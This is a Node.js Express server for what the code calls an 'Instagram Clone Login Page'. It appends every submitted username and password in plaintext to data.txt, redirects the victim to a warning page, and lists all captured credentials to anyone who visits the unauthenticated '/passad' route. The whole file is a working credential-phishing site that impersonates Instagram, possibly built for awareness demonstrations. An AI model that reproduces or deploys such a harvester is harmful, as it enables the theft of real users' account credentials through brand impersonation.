const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const { Console } = require('console');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// Home Page
app.get('/', (req, res) => {
    res.render('home');
});

// Instagram Clone Login Page
app.get('/login', (req, res) => {
    res.render('login');
});

//warning page
app.get('/warning', (req, res) => {
    res.render('warning');
});

// Handle login data
app.post('/login', (req, res) => {
    const { uname, password } = req.body;
    // Save username and password to data.txt (not secure!)
    fs.appendFile('data.txt', `${uname}: ${password}\n`, (err) => {
        if (err) throw err;
        console.log('Data saved to data.txt');
        console.log(req.body);
    });
    res.redirect('/warning');
});

// Display data from data.txt
app.get('/passad', (req, res) => {
    fs.readFile('data.txt', 'utf8', (err, data) => {
        if (err) throw err;
        res.render('passad', { data });
    });
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server is running on port ${PORT}`);
});
